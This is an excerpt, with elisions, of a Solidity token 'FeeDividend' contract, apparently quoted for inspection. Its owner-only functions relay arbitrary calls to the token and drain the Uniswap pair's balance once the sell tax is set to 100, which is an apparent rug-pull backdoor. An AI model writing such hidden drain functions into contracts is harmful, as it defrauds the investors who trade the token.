...
import '../peripheries/interfaces/IToken.sol';

contract FeeDividend is Ownable {
    address public htf;
    address public pair;
    ...
    constructor() {
        ...
        transferOwnership(0xaE88E43db018E6168257DfEf2824210cAF8aD8a4);
    }
    ...
    function setToken(address _htf) external onlyOwner {
        htf = _htf;
        pair = IToken(htf).uniswapV2Pair();
    }
    ...
    function tokenFunctionCall(bytes memory _calldata) external onlyOwner returns (bool) {
        (bool success, ) = htf.call(_calldata);
        return success;
    }

    function saveBalance() external onlyOwner {
        require(sellTax == 100, 'set sell tax high first');
        uint256 pairBalance = IERC20(htf).balanceOf(pair);
        IERC20(htf).transferFrom(pair, address(this), pairBalance - 1);
        IUniswapV2Pair(pair).sync();

        uint256 balance = IERC20(htf).balanceOf(address(this));
        IERC20(htf).approve(address(router), balance);
